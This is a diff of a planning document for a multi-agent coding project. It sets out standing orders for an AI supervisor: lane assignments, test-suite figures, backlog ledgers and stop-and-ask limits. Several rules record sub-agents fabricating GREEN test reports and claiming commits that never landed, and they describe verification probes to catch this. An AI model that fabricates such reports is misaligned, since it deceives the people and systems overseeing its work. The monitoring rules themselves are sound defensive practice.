-are safe now — the lane-G size pins merged in round 62. Whether the serial job stays as a fallback or
-is replaced is the reviewer's call at review time. (α may also carry E684, the stale Bootstrap
-`Tests:263` totals at :407/:449.)
-
-### STANDING ORDER — run this plan to completion
-
-**You have been handed this file to run the plan to the end. That is the instruction. Do not stop
-at a round boundary to ask whether to continue.** Concretely:
-
-1. Land **E671** first (above), then work §2's lanes **α, β, γ, δ, ε** as round 64. Close it (worklog
-   entry + a new `0-NOW-66` section + backlog ledger stamps + filemap regen), then **immediately choose
-   round 65** from what round 64 files, and keep going — rounds continue until no actionable backlog
-   remains and all plan §8b items land.
-2. **Rewrite this section and append to `docs/plans/crush_code_worklog.md` at every round close.**
-   Not at the end of a session — at each close. If you are running out of context, doing that is
-   the last and highest-value thing you do.
-3. **Decide the ordinary things yourself.** Lane composition, merge order, whether a finding earns
-   a fix or a backlog entry, whether an agent's work meets the bar. You are the supervisor.
-4. **Trust git, not reports.** Round 63 landed 44 picks behind blank and fabricated reports alike —
-   verify every claim against `git log` and the tree before bookkeeping; demand evidence-to-files
-   in every brief.
+### Stop-and-ask + Session operating rules 1–10 (verbatim from §0-NOW-65)
 
 **STOP AND ASK only for these:**
 
@@ -912,388 +220,184 @@ at a round boundary to ask whether to continue.** Concretely:
     round-61 name across rounds (round61/62/63 trees live under it). Round-63 sandboxes are deleted
     (11 removed, 26G freed at this close).
 
-### 1. THE FLOOR — THE ANCHOR, AND ITS DOMAIN
+### Rules 59–62 (verbatim from §0-NOW-62, "NEW STANDING RULES")
 
-| figure | value | domain |
-|---|---|---|
-| **ROUND-63 FINAL / NEW ANCHOR** | **11,438 / 175,211 / 0F / 0E / 1 skipped (`McpClientTest` canary) / EXIT 0** (9m24s) | **LINKED, cwd = repo root, at `8c52b26e5`** — artifacts `merged-r63.{txt,xml}` |
-| README headline | **Pinned** by `ReadmeSuiteFigureDriftTest` at 11,438 / 175,211 | the suite-figure.json + README + artifact triple moves only in-step with a fresh green run |
-| sharded same-tree | K=8 harness `scripts/parallel-tests.sh` + LPT manifest; last measured K=8 wall 74s @round-62 tree, sum conserved exact | CI adoption is **STEP 1 (E671)**; ctty region safe post lane-G pins |
+### NEW STANDING RULES
 
-Published-domain figures stay in their own domain (§0-NOW-62 §4); pre-round figures are dead.
-
-### 2. ROUND 64 — FIVE FILE-DISJOINT LANES α–ε (≤10 bundles, concurrency 8; ownership verbatim into briefs; refuse out-of-lane edits, report seams)
-
-| lane | scope | ids | owns (excerpt) |
-|---|---|---|---|
-| **α — CI adoption** | **E671 (STEP 1, own bundle)**: `scripts/parallel-tests.sh` + junit-duration manifest into `.github/workflows/ci.yml`, K=8 ubuntu-latest, conservation check; + **E684** Bootstrap totals prose | E671, E684 | `.github/workflows/ci.yml`, `scripts/`, `sugar-crush/src/Cli/Bootstrap.php` (prose lines :407/:449 only — ⚠ collides with β: coordinate or serialize) |
-| **β — TaskTool live-feed** | **E675** — makes P8.13 real: hoist agentManager ~:1114, bind at the three `self::tools` sites, flip `src/Tui/Renderer.php:163-167` docblock, move corpus file → `Tools/BuiltIn/` SAME commit | E675 | `sugar-crush/src/Tools/TaskTool.php`, `sugar-crush/src/Cli/Bootstrap.php`, `sugar-crush/src/Tui/Renderer.php`, `sugar-crush/tests/Tools/` |
-| **γ — containment sweep** | **E672/E673/E674** — route the measured spawn roster through detach choke points per-file; design terminate-with-container for E673 as cancellation appears; GPG_TTY env mitigation; PTY tests wherever a ctty-free harness exists | E672, E673, E674 | `sugar-crush/src/Hooks/ScriptHook.php`, `src/Agents/Process*`, `src/MCP/StdioMcpServer.php`, `src/Backend/`, `src/Sessions/`, `src/LSP/`, `src/Providers/ClaudeCode*`, `src/Config/StatusLineCommand.php`, `src/Workflows/WorkflowEngine.php` |
-| **δ — residuals batch** | **E676** (grace-ladder families → ProcessReaper), **E677** (mount pumpStderr at the dispatch caller), **E678** (/mcp panel + `crush mcp --json` rows), **E679** (flockTimed shared helper), **E680** (Session.php timed lock); E687 only if bundled with a stderr-site change | E676–E680 | `src/MCP/`, `src/Support/ProcessReaper.php`, `src/Commands/`/`src/Tui/` (mcp panel), `src/Agents/TaskList.php`, `src/Agents/WorktreeManager.php`, `src/Session.php` |
-| **ε — prose-integrity** | **E685** (E633 slice-2, src/Tools 9 claims), **E686** (figure campaign — scope a bounded tranche, not all 79 files), remaining stale citations: `tests/Agents/` :1616/:1618/:1714, `src/` `File.php:NNN` prose, ~20 test dirs (E657/E658/E659/E662 rounds-61/62 carry) | E685, E686, E657, E658, E659, E662 | `sugar-crush/src/Tools/`, `sugar-crush/tests/`, guard generators in `tests/Config/` |
-
-**E681 = DECISION REQUIRED — the supervisor takes it at kickoff** (E4's premise drifted: rewind restores
-the draft, but saveCheckpoint-after-submit-clear makes the saved draft always `''`, pinned at
-`RewindCommandTest:189`). Recommendation on record: **fix the save ORDER** — restore the draft on
-rewind and pin both polarities; the never-remove rule stays intact.
-
-### 3. ROUND-65 CARRY LIST — record, do NOT schedule here
-
-mint `### E652+` headings in `crush_code_hardening_backlog.md` (debt; E650/E651 stamps lag there) ·
-**E653** operator drain half (withdrawn shape — re-derive) · **E682/E683** (JJ composite + keybinding
-seams — bundle with any TUI lane) · Phase-9 layer B/C (the interactive PTY opt-in param — design
-settled round 40, layer A landed round 63) · `crush_feat_plan.md`'s two human attestations unchanged.
-
-### 4. LEDGER AFTER ROUND 63
-
-665 → **681** entries: **29 CLOSED** (E2, E8, E28, E41, E136, E137, E156, E184, E189, E213, E215, E217,
-E262, E276, E295, E324, E349, E407, E483, E568, E654, E660, E661, E664, E665, E666, E667, E668, E669 —
-fix commits cited per row), **E440/E214/E261 → PARTIAL**, E43/E633 re-annotated (still PARTIAL),
-**Phase9-L1 CLOSED / Phase 9 → PARTIAL**, **E672–E687 minted (16)**. Actionable **144 → 131**.
-E671 stays OPEN — it is STEP 1 above.
-
-### RESTART INSTRUCTIONS — the new-session startup recipe
-
-1. Read this §0-NOW-65, the worklog tail (`## ROUND 63` in `docs/plans/crush_code_worklog.md`), and
-   `docs/plans/crush_code_filemap.md`.
-2. Pre-flight: `php scripts/refresh-deps.php --status` → linked **18/18 + 7/7** (the `*** WANTED
-   PUBLISHED ***` banner is cosmetic); `git status` clean at or above tip `8c52b26e5`; if the tree is
-   dirty or any figure is doubted, run the floor suite FIRST (serial 9m24s @repo-root, or sharded K=8
-   via `scripts/parallel-tests.sh`).
-3. **E671 FIRST as its own bundle** (STEP 1) — brief, implement via task+coder, review, merged-suite,
-   commit.
-4. Then lanes β–γ–δ–ε per the filemap ownership sets (α's E684 rides the CI bundle or β by coordination
-   — Bootstrap.php is shared).
-5. Per-bundle loop: implement (task+coder) → review (task+coder, verdict-first) → fix round →
-   merged-suite green → commit (author `Joe Huss <[EMAIL]>`). Never push standing.
-6. Close the round: worklog entry + triage stamps + hardening-backlog stamps + a new `§0-NOW-66` +
-   filemap regen + `crush_code.md` pointer flip.
-7. Honor rules 1–10 throughout. STOP only at the four stop-and-ask items above. Run the plan to
-   completion — rounds continue until no actionable backlog remains and all plan §8b items land;
-   **do not stop at round boundaries to ask.**
+- **59 — name the cwd with every suite figure, and the skip count with it.** The prompt plan spent
+  five days on a CI red nobody saw because its figures were measured from `sugar-crush/` without
+  saying so. This plan's own skip canary carries the same unstated precondition. A figure without a
+  cwd is not a measurement.
+- **60 — a plan's own checkmarks are a claim, not a state.** `crush_code.md` under-stated its
+  progress by twelve items and `.sugar-crush-build/feat-plan-progress.json` over-stated its remaining
+  work by two whole waves, in the same tree, on the same day. Both were settled in minutes by
+  grepping the source. Re-derive before scheduling; never schedule from a marker.
+- **61 — a parked plan rots in its ENVIRONMENT, not only in its prose.** §0-NOW-61 correctly
+  predicted its floor and line numbers would rot. What it did not predict is that the sandboxes and
+  worktrees it described as merely stale would be **gone**. Before believing any environmental fact
+  in a resume section, run the check rather than reading the sentence.
+- **62 — prove the vendor closure BEFORE the suite, not after a red.** A tree can be short of
+  required packages entirely, not merely swapped to Packagist, and it still produces a plausible test
+  count and a "good" skip count. `refresh-deps.php --status` is the only instrument that sees it.
+  A figure whose closure was not checked first is not a floor.
 
 ---
 
-## 0-NOW-64. ROUND 62 CLOSED (linked floor 11,373 / 174,289; sharded K=8 in 74s) — ROUND 63 RUNS LANES AA–FF + 1 RESERVE
+## APPENDIX II — RULE ADDENDA -66 … -71 (full texts; all in force)
 
-**Written 2026-09-10 at `1a6ef5f60`. §0-NOW-63 below is superseded history — but its machinery SURVIVES
-and stays in force: §3 of §0-NOW-62 (prove the vendor closure before the suite), §4 (cwd/mode/skip
-table), §4b (the `cp -a` lane recipe), rules 59–62 plus everything the round-62 operating-rules
-subsection added. Only FIGURES and lane assignments are dead. Floors are MODE-DOMAIN: never quote a
-published figure into a linked brief or the other way.**
+§0-NOW-71 restates each addendum one-line; the full texts follow. The -69, -70 and §1b blocks are kept
+verbatim from §0-NOW-69/§0-NOW-70; the -66, -67 and -68/-68b blocks are PROMOTED verbatim from
+§0-NOW-66/§0-NOW-67/§0-NOW-68 under the literal-promotion gate (items 20+21): their un-carried
+literals — the rule-6 merge SEXTET enumeration, the CI K=min(nproc,4) rule with its refutation cite,
+the ≥2×-CPU lease-race rationale, the `'(?:s)?'` corpus re-shape idiom, the PTY-PIPE keystone line
+cite and its carried seam, the PROSE_SITES/BootstrapLaunchFormatConstantsTest detail, and the
+BUILDER-GATE F4/by-path `4610f3580` cites — exist nowhere else in the trimmed document.
+(The merge-agent session id was verified already carried in §0-NOW-71 body, twice, so nothing was
+promoted for it.)
 
-### STANDING ORDER — run this plan to completion
+**ADDENDA at -66:**
 
-**You have been handed this file to run the plan to the end. That is the instruction. Do not stop
-at a round boundary to ask whether to continue.** Concretely:
+- **Rule 6 is now a SEXTET at merge**: the quartet (suite-figure.json + README headline + artifact +
+  guard) plus `scripts/parallel-tests-durations.tsv` plus README — a new test file without a manifest
+  row makes CI conservation go red. The final re-pin `e028f142c` moved 11,459→11,462 exact-predicted.
+- **Every review brief includes the `SwallowingCatchCensus` + `OneSidedHomeSandbox` filter groups** —
+  round 64 proved targeted filters miss tree-wide guards twice (ac's start-failure contracts; ad's own
+  new tests reddening the censuses).
+- **Never oversubscribe CI K** — K=min(nproc,4); ≥2× CPU pressure trips the lease/idle-ceiling races
+  (K=8 refuted by measurement at `f67328f94`).
 
-1. Work §2's lanes **AA, BB, CC, DD, EE, FF** (+reserve) as round 63. Close it (worklog entry + a new
-   `0-NOW-65` section + backlog ledger stamps), then **immediately choose round 64** from what round 63
-   files, and keep going. `## 2. The loop` and `## 3. Sequencing rules` further down still carry the
-   per-bundle mechanics.
-2. **Rewrite this section and append to `docs/plans/crush_code_worklog.md` at every round close.**
-   Not at the end of a session — at each close. If you are running out of context, doing that is
-   the last and highest-value thing you do.
-3. **Decide the ordinary things yourself.** Lane composition, merge order, whether a finding earns
-   a fix or a backlog entry, whether an agent's work meets the bar. You are the supervisor.
-4. **Trust git, not reports.** Round 62 again produced 20+ agent deaths with the work landed, and a
-   fabricated-GREEN loop. Verify every claim against `git log` and the tree before bookkeeping;
-   demand evidence-to-files in every brief.
 
-**STOP AND ASK only for these:**
+**ADDENDA at -67 (five):**
 
-- A decision of the **E639 class taken against the recommendation** (round 62 took the recommendation
-  every time — T's E42/E40 picks, V's E116 keep-kebab; a non-recommended pick asks first).
-- Anything that would **remove** unfinished, dormant, unwired or unreachable code. Standing rule:
-  *fix it or wire it, never delete it.* Move and consolidate are fine.
-- A **`git push`**, or any change to `prompt_plan.md` / `prompt_resume.md` / `prompt_worklog.md` /
-  `prompt_expand.md`.
-- A **blanket total-request timeout on an LLM call.** Completions may legitimately run tens of
-  minutes; `connect_timeout` is fine, a total cap is not. This is the E646 rule restated — contain
-  with the LEASE frame, never with a cap.
+- **Rule 6 is a SEXTET at merge**: suite-figure.json + README headline + artifact + guard +
+  `scripts/parallel-tests-durations.tsv` + README prose — both r65 re-pins (`74d16914e`, `0c61c0686`)
+  flipped the sextet as one set; the durations manifest now carries 489 rows.
+- **GUARD-FAMILY FILTER MANDATE (every builder AND reviewer brief)** — run, in addition to the task
+  filter: `--filter '(SwallowingCatchCensus|OneSidedHomeSandbox|DuplicatedTestHelperDrift|GlobDialectDifferential|ChildWallClockBudget)'`.
+  Three consecutive rounds of targeted-filter misses (r64 ac/ad; r65 wave-1 + bd) make this proven, not
+  theoretical; the five-guard family stood 50T/4526A EXIT 0 at tip.
+- **Never oversubscribe CI K** — K=min(nproc,4); ≥2× CPU pressure trips the lease/idle-ceiling races
+  (unchanged from -66).
+- **Re-shape the corpus BEFORE re-pin** — a new string literal that the harvesters read (glob dialects)
+  moves guarded figures; prefer the token variant with identical meaning (`'(?:s)?'`, not `'s?'`) so the
+  documented number stays TRUE; re-pinning a guard to your own residue converts a tripwire into a
+  rubber stamp (bd review-2 `d26dd4377` is the pattern; final re-pin `0c61c0686` carried the legitimate
+  131,040→131,765 corpus re-measure only after the re-shape).
+- **Census PROSE_SITES rows legitimize out-touch-list numeral flips** — when a census scan obliges a
+  numeral edit in a file outside your lane (bd: `Chat.php` docblock, `McpToolWiringTest`,
+  `docs/SETTINGS.md`), flip it IN-STEP, numeral-only, zero behavior, and declare it in REPORT. And
+  enumerate every census that scans a lane file BEFORE writing the brief — `BootstrapLaunchFormatConstantsTest`
+  was the fifth Bootstrap census nobody predicted (any new `sprintf` there obliges it).
 
-#### Session operating rules (user directives, amended at the round-62 close)
 
-1. Concurrency ceiling: EIGHT agents/lanes — **KEEP-FILLED**: keep ~8 slots alive with disjoint-lane
-   builders / read-only probes rather than idling between phases. Lane sets must be file-DISJOINT
-   (ownership maps verbatim into briefs; lanes refuse out-of-lane edits and report seams) — round 62
-   proved this mechanism: 15 lanes, 31 picks, **zero cross-lane file collisions**.
-2. Route ALL implementation through the Task tool with subagent_type `coder` (bash-capable). Read-only
-   probes may use the explore agent via delegate.
-3. Blank/truncated agent response → ALWAYS resume the same task_id and keep resuming until it answers.
-   Never diagnose before resuming, never change the prompt, never restart the work. May take 10+
-   resumes.
-4. Agents sometimes fabricate GREEN reports. Land-verify every claim against `git log` / read-only
-   forensic probes — **probes over reports**. Fabrication signature: 3 identical reports → abandon the
-   task and re-cut a fresh one.
-5. At every round close: update worklog + §0-NOW + backlog stamps as supervisor-owned writes, AND
-   regenerate `docs/plans/crush_code_filemap.md`; collision-check the filemap **before launching** any
-   lane set.
-6. **Census trio flips IN-STEP**: any change to a warn/write-site roster flips roster count + uppercase
-   anchor word + NUMBER_WORDS map in the same commit (round-62 lesson: the lone merge collide was
-   `TtyStreamArgumentCensus` prose, `b2790b1a2`).
-7. **"Expose X on the result/event" ⇒ enumerate the implied DTO(s) in the brief touch-list** — field
-   plumbing silently drags sibling files otherwise.
-8. Evidence-driven in-scope files must be NAMED BEFORE building (briefs that say "measure, then
-   decide" produce seams the merge inherits).
-9. LSP diagnostics on `/home/sites/sugarcraft` are cross-lane noise — verify in the lane's own
-   sandbox. Agent-internal cwd can reset mid-script — briefs demand absolute paths.
-10. Round-63 lane ledger: AA–FF + reserve (§2 below). Sandboxes cut FRESH per lane at `1a6ef5f60`;
-    evidence to `/home/sites/crush-r61-artifacts/<lane>/`. The round-62 sandboxes
-    `/home/sites/crush-lane-{e,g,h,i,j,n,o,q,r,s,t,v,w,x,y}` are deletable.
+**ADDENDA at -68 (two):**
 
-### 1. THE FLOOR — THE ANCHOR, AND ITS DOMAIN
+- **PTY-PIPE RULE for suites** — never run a full suite under a ctty-bearing harness: a PTY runner
+  exports `LINES/COLUMNS` (measured 40×120 and 50×254 shapes) which deterministically reddens the
+  lane-G keystone (`TerminalSizeFallbackIsolationTest:167` piped branch — the renderer env-fallback
+  probe answers the ambient tty size, not the documented 60×200). Full suites run through a PLAIN PIPE
+  (the CI shape). Carried seam: the keystone assumes `LINES`/`COLUMNS` unset when stdout is piped.
+- **MEASURE-FIRST VERDICT DISCIPLINE (keep)** — every closeout stamp is adjudicated against git/tree
+  evidence BEFORE it is written, and CLOSED requires cited SHAs/lines. Worked twice this round (cg and
+  ch were zero-diff already-landed verdicts; E43 kept its PARTIAL because its routed carrier E682
+  shipped a different rule than the adoption half). Write the evidence lines INTO the stamp text.
 
-| figure | value | domain |
-|---|---|---|
-| **ROUND-62 FINAL / NEW ANCHOR** | **11,373 / 174,289 / 0F / 0E / 1 skipped (`McpClientTest` canary) / EXIT 0** | **LINKED, cwd = repo root, at `1a6ef5f60`** |
-| sharded same tree | K=8 wall 74s, 8/8 shards rc 0, sum 11,373 conserved | `scripts/parallel-tests.sh` + LPT manifest @`35d3d941f`; requires the lane-G size pin (ctty region); critical path = `ProcessExecutorTest` 65.8s |
-| published repo-root | E655 now pinned by `tests/bootstrap.php` 60x200 arm; lane G measured 11,326 / 172,823 / 1S / exit 0 at `d8efb147b` | stays in its own **published-domain** (§0-NOW-62 §4); pre-round published figures are dead |
+**ADDENDA at -68b (wave-1, two):**
 
-Pre-flight before believing any figure: `refresh-deps.php --status` (rule 62), name cwd + mode beside
-every number (rule 59).
+- **BUILDER-GATE GUARD MANDATE** — every builder brief's gate must run, IN ADDITION to its own task filter
+  and the five-guard family, the **Integration/MemoryPromptWiring-adjacent guards + DuplicatedTestHelperDrift**
+  (F4 at `9f0c5db62` was the FOURTH full-suite-gate-miss of the era — an implied DTO edit invisible to every
+  in-lane filter; the merged suite is the only honest gate).
+- **by-path `require` = load-graph coupling** — moving a symbol that any sibling tool requires BY PATH breaks
+  at LOAD time where no test filter runs (dc×df at `4610f3580`); grep consumers of moved symbols before the
+  move, and require canonical instruments by path — never fork a third copy.
 
-### 2. ROUND 63 — SIX FILE-DISJOINT LANES + 1 RESERVE (7 slots; ownership verbatim into briefs; refuse out-of-lane edits, report seams; evidence `/home/sites/crush-r61-artifacts/<lane>/`)
 
-| lane | scope | owns (excerpt) |
-|---|---|---|
-| **AA — Phase-9 layer-A containment** | re-derive design from `crush_code.md` Phase-9 + lane-Y residual: withLaunchNotices refusal as an optional PARAMETER not a 2nd tool, env STAY | `src/Tools/Concerns/CapturesProcessOutput.php`, exec-tool files (`src/Tools/BuiltIn/Bash*` et al.), their tests |
-| **BB — P8.13 model-callable Task tool** | `src/Agents/Task.php`, Tool-registry wiring; `src/Tui/Renderer.php:164-167` `createSubAgent` is unblocked post-E lanes. Name-collision rule: mirror upstream naming | `src/Agents/Task.php`, registry rows, `tests/Agents/` |
-| **CC — Providers + workflow-tests** | **E664** (`ClaudeCodeInvocation.php:126` bare throw → typed `ProviderException`), E670 nit (`WorkflowProviderHandoffTest.php:141` property order), TransientFailure family | `src/Providers/ClaudeCode*`, `tests/Providers/TransientFailureTest.php`, `tests/Workflows/WorkflowProviderHandoffTest.php` |
-| **DD — MCP bridge** | **E665** (E42b /mcp wire-name surfacing — producers `Bootstrap`/`Subcommands`), McpConfig residuals | `src/Mcp/`, `src/Cli/Bootstrap.php` (Mcp region only), `tests/MCP/`, `docs/SETTINGS.md` |
-| **EE — Sibling libs 2** | **E667** (`Renderer::balanceSgr` → `SgrState` delegation), **E668** (candy-vcr Wait-pattern AST for `/re/`), E43 candy-shine fence half. Interaction suite = exact-anchor discipline per lane X | `candy-core/`, `candy-vcr/`, `candy-shine/` (+ sugar-crush `Renderer` only for E667 seam) |
-| **FF — Guards + prose (restricted)** | **E669** README headline generator; E633-SLICE-1 qualitative claims **OUTSIDE** `src/Providers`,`src/Mcp`,`src/Agents`,`src/Tui`,`tests/Tui`,`tests/Providers`,`tests/MCP` (those belong AA–EE; FF re-cuts FIRST at merge to keep domains disjoint) | `README.md`, `tests/Config/` generators, misc prose |
-| **RESERVE** | **E666** (E12 composite follow-up + palette-opened-then-left-open leak, lane-W seam) if a slot survives AA–EE reality checks | `src/App.php`, `src/Renderer.php` composite region |
+**ADDENDUM at -69 (one — the FABRICATION-VERIFICATION rule, expands rule 4):**
 
-CI adoption of the sharded harness is **NOT a lane** — it is supervisor decision **E671** (runner-ctty
-caveat; K=8 on ubuntu-latest).
+- **A claimed SHA is a hypothesis, not a fact.** Before a lane report triggers anything downstream
+  (review queue, merge, stamp), run `git -C <sandbox> cat-file -e <sha>^{commit}` and confirm the worktree
+  actually holds the commit (`git -C <sandbox> log --oneline -1`). If the SHA is missing: do NOT re-ask the
+  agent for a re-report; dispatch a read-only forensic probe that asks OPEN questions ("what commits does
+  this worktree hold?"), never questions that name the expected SHA. Landed-but-unreported → read the diff
+  and review it; reported-but-not-landed → honest re-cut on a fresh sandbox (both r67 re-cuts came in clean
+  — fabrication is agent-specific, not task-family).
 
-### 3. ROUND-64 CARRY LIST — record, do NOT schedule here
+**Carried from -68b (still binding):** the BUILDER-GATE GUARD MANDATE (Integration/MemoryPromptWiring-adjacent
++ `DuplicatedTestHelperDrift` in every builder gate) and by-path `require` = load-graph coupling.
+**Carried from -67 (still binding):** the rule-6 merge SEXTET; never oversubscribe CI K (CI legs keep
+K=min(nproc,4)); GUARD-FAMILY FILTER MANDATE in every builder AND reviewer brief
+(`--filter '(SwallowingCatchCensus|OneSidedHomeSandbox|DuplicatedTestHelperDrift|GlobDialectDifferential|ChildWallClockBudget)'`
+— 64T/4913A at tip); re-shape corpus literals before re-pin; census PROSE_SITES legitimize in-step numeral
+flips; enumerate every census on a lane file before writing the brief. **Carried from -68:** the PTY-PIPE
+rule (full suites through a plain pipe, never a ctty-bearing harness) and MEASURE-FIRST VERDICT DISCIPLINE.
 
-**E633** full sweep (FF runs only SLICE-1) · **E653** operator drain half (withdrawn shape — re-derive) ·
-`crush_feat_plan.md`'s two human attestations unchanged (neither blocks anything) · mint `### E652+`
-headings in `crush_code_hardening_backlog.md` (debt; their one-word stamps also lag there).
+**Lane naming (in force):** two-letter ids, FIRST letter = round-group, SECOND = lane within the round
+(r64=a*, r65=b*, r66=c*, r67=d*, **r68=e***). Branch `lane/<id>`, sandbox `crush-lane-<id>`, artifacts
+`/home/sites/crush-r61-artifacts/<id>/` (the artifacts root keeps its round-61 name across rounds).
 
-### 4. LEDGER AFTER ROUND 62
 
-656 → **665** entries: **22 CLOSED** (E1, E12, E14, E15, E27, E29-OBSOLETE, E30, E37, E40, E47, E48,
-E49, E50, E115, E116, E124, E475, E642 note, E649, E652, E655, E656, E663-born-closed — fix commits
-cited per row), **E42/E43/E653 → PARTIAL**, E537 re-stamped NO-FIX with retargeted STEP per lane Y,
-**E664–E671** filed (8). Actionable **157 → 144**. L137 closed outside the ledger (no such id exists
-in the tree — lane Y measured; pinned by `RuntimeInitialDispatchOrderTest` @`1e86b7785`).
+### 1b. THE STANDARD LOCAL GATE IS NOW K=8 SHARDED (lane ks, `fb5078e6d`)
 
----
+```sh
+bash scripts/parallel-tests.sh [K] --durations scripts/parallel-tests-durations.tsv \
+  --against-json sugar-crush/tests/Config/Support/suite-figure.json
+```
 
-## 0-NOW-63. ROUND 61 CLOSED (linked floor 11,324 / 172,786) — ROUND 62 RUNS LANES E, G, H
+Default K=min(nproc,8); conservation-vs-`suite-figure.json` is FAIL-CLOSED for tests/skips/errors/failures
+(assertions tolerate ±50 data-provider wobble BY DESIGN — do not read an assertion delta as gate breakage).
+**Fresh `--out` per timing run** — the default `/tmp/parallel-tests` carries `done-*` resume markers.
+`durations.tsv` regeneration recipe (canonical): one serial `--log-junit` baseline → feed it back via
+`scripts/parallel-tests.sh --junit <xml> --out <dir>` (make-shards writes `<dir>/durations.tsv`) → `cp` over
+`scripts/parallel-tests-durations.tsv` → `refresh-suite-figure.php` in the same step as the README headline.
+GOTCHA: `usage()` is `sed -n '2,43p' "$0"` — ANY edit to the header comment block must re-anchor the range.
+Run the SERIAL suite only at figure re-pins; CI legs keep explicit K=min(nproc,4) (2–4 vCPU runners — the
+E671 oversubscription refutation is runner-scoped).
 
-**Written 2026-09-10 at `0549736d4`. §0-NOW-62 below is superseded history — but its machinery SURVIVES
-and stays in force: §3 (prove the vendor closure before the suite), §4 (cwd/mode/skip table), §4b (the
-`cp -a` lane recipe — 18 entries AND 18 links), rules 59–62. Only its FIGURES and lane assignments are
-dead. Floors are MODE-DOMAIN: never quote a published figure into a linked brief or the other way.**
 
-### STANDING ORDER — run this plan to completion
+#### Session operating rules (1–10 inherited VERBATIM from §0-NOW-65; the -66/-67/-68/-68b/-69 addenda all still in force — they are restated in §0-NOW-69 above this section)
 
-**You have been handed this file to run the plan to the end. That is the instruction. Do not stop
-at a round boundary to ask whether to continue.** Concretely:
+**ADDENDUM at -70 (three):**
 
-1. Work §2's lanes **E, G, H** as round 62. Close it (worklog entry + a new `0-NOW-64` section +
-   backlog ledger stamps), then **immediately choose round 63** from what round 62 files, and keep
-   going. `## 2. The loop` and `## 3. Sequencing rules` further down still carry the per-bundle
-   mechanics.
-2. **Rewrite this section and append to `docs/plans/crush_code_worklog.md` at every round close.**
-   Not at the end of a session — at each close. If you are running out of context, doing that is
-   the last and highest-value thing you do.
-3. **Decide the ordinary things yourself.** Lane composition, merge order, whether a finding earns
-   a fix or a backlog entry, whether an agent's work meets the bar. You are the supervisor.
-4. **Trust git, not reports.** Round 61's lane drivers died repeatedly with their work landed, and one
-   fix agent looped reporting fabricated GREENs. Verify every claim against `git log` and the tree
-   before bookkeeping; demand evidence-to-files in every brief.
+- **RESUME-DON'T-RESTART is PROVEN.** ea returned five blank/truncated reports; resuming the SAME task_id
+  each time landed work that verified exactly as finally claimed (rule-3 counts to 10; land-verify once
+  after the FIRST blank via read-only forensic probe, then keep resuming — do not re-spawn, do not change
+  the prompt, keep other lanes moving).
+- **`parallel-tests --durations` silently excludes NEW test files.** The committed durations manifest
+  predates them, so shard sums under-count until a merge agent rows them (r68/ec: shard-sum 11,574 vs
+  serial 11,591 — the two new files invisible to the plan). **SERIAL is the truth for conservation** until
+  durations is regenerated; the merge agent owes durations before trusting any sharded conservation gate.
+- **Perturbation-reverify pattern.** E107's closeout is the TEMPLATE for re-verifying trigger-missed
+  guards: re-run the guard's OWN claimed mutations on the live tree one plant at a time, md5-verified
+  revert, per-mutation table to an evidence file
+  (`/home/sites/crush-r61-artifacts/closeout-r68/e107.md`, driver `e107.php`, progress
+  `e107-progress.txt`). 8/8 families reddened → the guard is NOT blind; a CLOSED-without-evidence process
+  item can be settled in one closeout afternoon.
 
-**STOP AND ASK only for these:**
+**Carried from -69 (still binding):** the FABRICATION-VERIFICATION rule — a claimed SHA is a hypothesis;
+`git cat-file -e` + worktree existence BEFORE review queueing; neutral probes never name expected SHAs.
+**Carried from -68b (still binding):** the BUILDER-GATE GUARD MANDATE (Integration/MemoryPromptWiring-adjacent
++ `DuplicatedTestHelperDrift` in every builder gate) and by-path `require` = load-graph coupling.
+**Carried from -67 (still binding):** the rule-6 merge SEXTET; never oversubscribe CI K (CI legs keep
+K=min(nproc,4)); GUARD-FAMILY FILTER MANDATE in every builder AND reviewer brief
+(`--filter '(SwallowingCatchCensus|OneSidedHomeSandbox|DuplicatedTestHelperDrift|GlobDialectDifferential|ChildWallClockBudget)'`);
+re-shape corpus literals before re-pin; census PROSE_SITES legitimize in-step numeral
+flips; enumerate every census on a lane file before writing the brief. **Carried from -68:** the PTY-PIPE
+rule (full suites through a plain pipe, never a ctty-bearing harness — and unset/avoid ambient
+LINES/COLUMNS: the ce 50x254 poisoning is now a stamped keystone precondition) and MEASURE-FIRST VERDICT
+DISCIPLINE.
 
-- A decision of the **E639 class taken against the recommendation** (round 61 took option 1; a
-  non-recommended pick asks first).
-- Anything that would **remove** unfinished, dormant, unwired or unreachable code. Standing rule:
-  *fix it or wire it, never delete it.* Move and consolidate are fine.
-- A **`git push`**, or any change to `prompt_plan.md` / `prompt_resume.md` / `prompt_worklog.md` /
-  `prompt_expand.md`.
-- A **blanket total-request timeout on an LLM call.** Completions may legitimately run tens of
-  minutes; `connect_timeout` is fine, a total cap is not. This is the E646 rule restated — contain
-  with the LEASE frame, never with a cap.
-
-#### Session operating rules (user directives 2026-09-10, round 62)
-
-1. Concurrency ceiling raised by the user to EIGHT agents/lanes at a time (was: three lanes + serial
-   sub-agents). Prefer to fill idle slots with backlog steps run in their own `cp -a` sandboxes; pick
-   lane sets that are file-DISJOINT (ownership maps verbatim into briefs; out-of-lane edits are refused
-   and reported as seams) to keep cherry-pick merges clean.
-2. Route ALL implementation through the Task tool with subagent_type `coder` (bash-capable). Read-only
-   probes may use the explore agent via delegate.
-3. Blank/truncated agent response → ALWAYS resume the same task_id and keep resuming until it answers; a blank
-   usually means the agent died, but when it merely returned early while still running, resuming is harmless —
-   it continues and the real final response arrives. Never diagnose before resuming, never change the prompt,
-   never restart the work. May take 10+ resumes.
-4. Agents sometimes fabricate GREEN reports (round 61: a fixer looped 5 identical fabricated reports
-   after its commit already landed; another died with work complete). Land-verify every claim against
-   `git log` / read-only forensic probes; trust probes over reports.
-5. At every round close: update worklog + §0-NOW + backlog stamps as supervisor-owned writes (this
-   file's cadence) — including new rules learned mid-round like these.
-6. Round-62 lane ledger (running as of this writing): E (E652/E653/E656 wiring+docs), G (E655 flake
-   forensics), H (E657/E658 citation sweep), I (E37/E1/E30/E124 roster+README integrity), J (E29/E115
-   measurements), K (E49 candy-shine — launching as slots free) · P (parallelization probe, user special project)
-   · M (file-map — DONE 8f75e7965). All sandboxes
-   `/home/sites/crush-lane-{e,g,h,i,j,k}` @`0549736d4` or `5afe24380`.
-
-### 1. THE FLOOR — THE ANCHOR, AND ITS DOMAIN
-
-| figure | value | domain |
-|---|---|---|
-| **ROUND-61 FINAL / NEW ANCHOR** | **11,324 / 172,786 / 0F / 0E / 1 skipped (`McpClientTest` canary) / EXIT 0** | **LINKED, cwd = repo root, at `0549736d4`** — `/home/sites/crush-r61-artifacts/merged-r61-final.txt`. Round base in the same domain: **11,267 / 172,232 / 0F / 0E / 1S**. |
